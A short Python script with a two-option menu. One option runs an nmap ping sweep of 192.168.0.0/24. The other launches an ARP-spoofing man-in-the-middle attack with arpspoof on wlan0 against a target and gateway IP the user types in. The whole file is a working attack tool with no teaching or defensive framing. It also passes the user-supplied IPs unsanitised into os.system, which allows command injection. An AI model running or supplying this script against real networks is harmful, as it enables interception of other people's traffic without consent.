import os
import subprocess

# Network Scan Function
def network_scan():
    print("[+] Scanning the network...")
    try:
        result = subprocess.check_output(["nmap", "-sn", "192.168.0.0/24"], universal_newlines=True)
        print(result)
    except Exception as e:
        print(f"Error: {e}")

# MITM Attack Function
def mitm_attack(target_ip, gateway_ip):
    print("[+] Starting ARP spoofing...")
    try:
        os.system(f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}")
    except Exception as e:
        print(f"Error: {e}")

# Main Menu
if __name__ == "__main__":
    print("Choose an option:")
    print("1. Scan Network")
    print("2. Start MITM Attack")
    choice = input("Enter your choice: ")

    if choice == "1":
        network_scan()
    elif choice == "2":
        target = input("Enter target IP: ")
        gateway = input("Enter gateway IP: ")
        mitm_attack(target, gateway)
    else:
        print("Invalid choice.")
